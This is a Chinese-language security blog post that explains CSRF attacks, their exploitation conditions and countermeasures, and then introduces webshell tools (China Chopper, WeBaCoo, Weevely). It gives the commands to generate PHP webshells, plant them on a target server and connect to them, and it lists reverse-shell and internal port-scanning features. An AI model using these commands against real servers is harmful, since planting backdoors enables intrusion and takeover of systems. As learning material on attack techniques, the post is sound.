---
title: CSRF和WebShell
date: 2018-02-05 16:08:24
categories: 安全
tags: 漏洞
---
CSRF（Cross-site request forgery）
---
与xss经常混淆，可以从信任的角度来区分
XSS：利用用户对站点的信任
CSRF：利用站点对已经身份认证的信任
结合社会工程学在身份认证会话过程中实现攻击
+ 修改帐号密码、个人信息（电话、收货地址）
+ 发送伪造的业务请求（网银、购物、投票）
+ 关注他人社交帐号、推送博文
+ 在用户非自愿、不知情的情况下提交请求

CSRF 典型的场景：
攻击通过在授权用户访问的页面中包含链接或者脚本的方式工作。例如：一个网站用户Bob可能正在浏览聊天论坛，而同时另一个用户Alice也在此论坛中，并且后者刚刚发布了一个具有Bob银行链接的图片消息。设想一下，Alice编写了一个在Bob的银行站点上进行取款的form提交的链接，并将此链接作为图片src。如果Bob的银行在cookie中保存他的授权信息，并且此cookie没有过期，那么当Bob的浏览器尝试装载图片时将提交这个取款form和他的cookie，这样在没经Bob同意的情况下便授权了这次事务。

漏洞利用条件：
+ 被害用户已经完成身份认证
+ 新请求的提交不需要重新身份认证或确认机制
+ 攻击者必须了解WEB APP请求的参数构造
+ 诱使用户出发攻击的指令（社会工程学）

利用Burpsuite的CSRF Poc Generator可以生成代码
![](http://upload-images.jianshu.io/upload_images/5834506-097ede2ada1536cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)  
点击之后就会自动生成html代码
自动扫描程序的检测方法
+ 在请求和相应过程中检查是否存在anti-CSRF token名
+ 检查服务器是否验证anti-CSRF token的名值
+ 检查token中可编辑的字符串
+ 检查referrer 头是否可以伪造

对策
+ Captcha
+ anti-CSRF token
+ Referrer头
+ 降低会话超时时间

WEBSHELL介绍
---
webshell就是一些放置在服务器的脚本文件通过参数来执行操作系统的一些指令
一些WEBSHELL工具介绍：
+ 中国菜刀
据说官网是：http://www.maicaidao.co/ 注意：不确定这个版本是否有木马，网上有很多版本安插了自己的木马，如果执行的话就中病毒了，所以请保证在虚拟机执行，之后恢复
操作方式：将菜刀文件下的服务器代码注入到服务器，然后执行客户端程序，就能连上目标服务器
+ WeBaCoo（Web Backdoor Cookie）
类终端的shell，编码通信内容通过cookie头传输，隐蔽性较强，只支持php
cm：base64编码的命令
cn：服务器用于返回数据的cookie头的名
cp：返回信息定界符
+ Weevely
隐蔽的类终端php webshell
30多个管理模块
  + 执行系统命令，浏览文件系统
  + 检查服务器常见配置错误
  + 创建正向，反向TCP shell 连接
  + 通过目标 计算机代理HTTP流量
  + 从目标计算机运行端口扫描，渗透内网
  + 支持连接密码

由于中国菜刀网上不确定的版本太多，就不介绍了，主要介绍WeBaCoo、Weevely

WeBaCoo
---
生成服务端`webacoo -g -o a.php` 
然后把生成的`a.php`注入到目标服务器
最后生成客户端程序`webacoo -t -u http://1.1.1.1/a.php`连接目标服务器
更多参数的使用可以`webacoo -h`查看
Weevely
---
生成服务端`weevely generate <password> b.php`其中的<password>是自己设置的连接密码，以后客户端都要使用连接密码，生成的`b.php`文件在/var/share/weevely目录下
然后把`b.php`注入到目标服务器
最后连接`weevely  http://1.1.1.1/b.php <password>`连接目标服务器
在连接完目标服务器的shell下输入命令`help`可以查看Weevely的模块

关于怎么注入文件，之前的博文已经有介绍了，可以去看看学习一下

